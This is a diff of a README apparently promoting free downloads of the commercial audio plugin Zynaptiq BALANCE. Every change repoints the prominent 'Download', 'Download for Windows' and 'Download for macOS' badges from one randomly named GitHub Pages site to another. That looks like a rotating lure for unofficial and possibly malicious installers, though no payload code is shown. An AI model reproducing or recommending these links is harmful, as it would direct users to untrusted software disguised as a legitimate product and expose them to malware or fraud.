@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Zynaptiq BALANCE](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_ZYNAPTIQ_BALANCE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
+[![Download Zynaptiq BALANCE](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_ZYNAPTIQ_BALANCE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://iggoiiltktso.github.io/win-installer/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Zynaptiq BALANCE** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-E65100?style=for-the-badge&logo=windows&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-E65100?style=for-the-badge&logo=apple&logoColor=white)](https://DikeSupporterFurnish.github.io/macos-installer/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-E65100?style=for-the-badge&logo=windows&logoColor=white)](https://iggoiiltktso.github.io/win-installer/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-E65100?style=for-the-badge&logo=apple&logoColor=white)](https://iggoiiltktso.github.io/mac-get/)
 
 </div>
 
